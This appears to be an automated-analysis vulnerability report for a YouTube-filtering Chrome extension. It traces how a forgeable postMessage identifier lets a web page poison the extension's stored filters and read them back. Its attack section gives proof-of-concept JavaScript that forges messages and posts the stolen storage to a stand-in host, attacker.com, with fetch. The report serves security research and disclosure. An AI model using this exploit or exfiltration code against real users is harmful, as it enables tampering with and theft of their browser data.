# CoCo Analysis: bbeaicapbccfllodepmimpkgecanonai

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple instances of storage_local_get_source → window_postMessage_sink

---

## Sink: storage_local_get_source → window_postMessage_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bbeaicapbccfllodepmimpkgecanonai/opgen_generated_files/bg.js
Line 1072: `chrome.storage.local.get('storageData', (data) => {`
Line 1074: `storage = data.storageData;`
Line 1031: `const sendData = { filterData: {}, options: data.options };`
Line 1048: `port.postMessage({ type: 'filtersData', data: { storage, compiledStorage } });`

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bbeaicapbccfllodepmimpkgecanonai/opgen_generated_files/cs_0.js
Line 476-480: `window.postMessage({ from: 'BLOCKTUBE_CONTENT', type: 'storageData', data: compiledStorage || globalStorage }, document.location.origin);`

**Code:**

```javascript
// ATTACK FLOW: Complete storage exploitation chain

// 1. ENTRY POINT - Content script listens for webpage messages (cs_0.js:543-549)
window.addEventListener('message', (event) => {
  if (event.source !== window) return;
  if (!event.data.from || event.data.from !== 'BLOCKTUBE_PAGE') return;  // ← Weak check, attacker can forge!

  switch (event.data.type) {
    case 'contextBlockData': {
      events.contextBlock(event.data.data);  // ← Attacker-controlled data flows here
      break;
    }
  }
}, true);

// 2. STORAGE POISONING - Content script sends to background (cs_0.js:492-509)
const events = {
  contextBlock(data) {
    if (!data.info.id) return;
    const entries = [`// Blocked by context menu (${data.info.text}) (${now})`];
    const id = Array.isArray(data.info.id) ? data.info.id : [data.info.id];
    entries.push(...id);  // ← Attacker-controlled data
    port.postMessage({'type': 'contextBlock', 'data': {'type': data.type, 'entries': entries}})  // ← Send to background
  }
};

// 3. BACKGROUND STORES DATA (bg.js:1087-1091)
port.onMessage.addListener((msg) => {
  switch (msg.type) {
    case 'contextBlock': {
      storage.filterData[msg.data.type].push(...msg.data.entries);  // ← Poisoned data stored
      chrome.storage.local.set({storageData: storage});  // ← Persisted to storage
      break;
    }
  }
});

// 4. STORAGE CHANGE TRIGGERS BROADCAST (bg.js:1099-1104)
chrome.storage.onChanged.addListener((changes) => {
  if (has.call(changes, 'storageData')) {
    storage = changes.storageData.newValue;  // ← Retrieved from storage
    compiledStorage = utils.compileAll(changes.storageData.newValue);
    utils.sendFiltersToAll();  // ← Sends to all content scripts
  }
});

// Background sends to content scripts (bg.js:1052-1054)
sendFiltersToAll() {
  Object.keys(ports).forEach((p) => {
    ports[p].postMessage({ type: 'filtersData', data: { storage, compiledStorage } });  // ← Poisoned data sent back
  });
}

// 5. DATA EXFILTRATION - Content script receives and sends back to webpage (cs_0.js:515-521)
port.onMessage.addListener((msg) => {
  switch (msg.type) {
    case 'filtersData': {
      if (msg.data) {
        globalStorage = msg.data.storage;  // ← Receives poisoned storage
        compiledStorage = msg.data.compiledStorage;
        utils.sendStorage();  // ← SENDS BACK TO WEBPAGE!
      }
      break;
    }
  }
});

// Content script sends storage data via window.postMessage (cs_0.js:475-480)
const utils = {
  sendStorage() {
    window.postMessage({
      from: 'BLOCKTUBE_CONTENT',
      type: 'storageData',
      data: compiledStorage || globalStorage,  // ← Attacker retrieves poisoned data!
    }, document.location.origin);
  }
};
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM-based) - Complete storage exploitation chain

**Attack:**

```javascript
// Step 1: Attacker webpage (youtube.com) sends message to poison storage
window.postMessage({
  from: 'BLOCKTUBE_PAGE',  // Forge the expected origin identifier
  type: 'contextBlockData',
  data: {
    type: 'channelId',  // Can also use 'videoId', 'title', 'channelName', 'comment'
    info: {
      id: 'ATTACKER_PAYLOAD_HERE',
      text: 'attacker controlled text'
    }
  }
}, '*');

// Step 2: Listen for the storage data being sent back
window.addEventListener('message', (event) => {
  if (event.data.from === 'BLOCKTUBE_CONTENT' && event.data.type === 'storageData') {
    console.log('Stolen storage data:', event.data.data);
    // Exfiltrate to attacker server
    fetch('https://attacker.com/exfil', {
      method: 'POST',
      body: JSON.stringify(event.data.data)
    });
  }
});

// Complete exploit: Poison and retrieve
window.postMessage({
  from: 'BLOCKTUBE_PAGE',
  type: 'contextBlockData',
  data: {
    type: 'channelId',
    info: {
      id: ['malicious_id_1', 'malicious_id_2'],
      text: 'Malicious entry'
    }
  }
}, '*');

// The extension will:
// 1. Accept the message (weak origin check only verifies event.data.from)
// 2. Store it in chrome.storage.local
// 3. Automatically send all storage data back via window.postMessage
// 4. Attacker receives the complete storage including their poisoned data
```

**Impact:** Complete storage manipulation and information disclosure vulnerability. An attacker controlling a YouTube webpage can:
1. **Poison storage**: Inject arbitrary data into the extension's storage under keys like 'channelId', 'videoId', 'title', 'channelName', or 'comment'
2. **Retrieve all storage data**: The extension automatically sends all storage data (including user's personal filter lists, preferences, and the attacker's poisoned data) back to the webpage via window.postMessage
3. **Persistence**: Poisoned data persists across sessions since it's stored in chrome.storage.local
4. **Information disclosure**: Access to all user-configured filters and extension settings
5. **Denial of service**: Corrupt storage to break extension functionality

The vulnerability exists because:
- The extension uses a weak origin check (`event.data.from === 'BLOCKTUBE_PAGE'`) that attackers can trivially forge
- Storage data is automatically sent back to the webpage via window.postMessage after any storage change
- Per the methodology, we IGNORE manifest.json content_scripts matches restrictions - even though this only runs on YouTube domains, we treat any webpage as potentially attacker-controlled
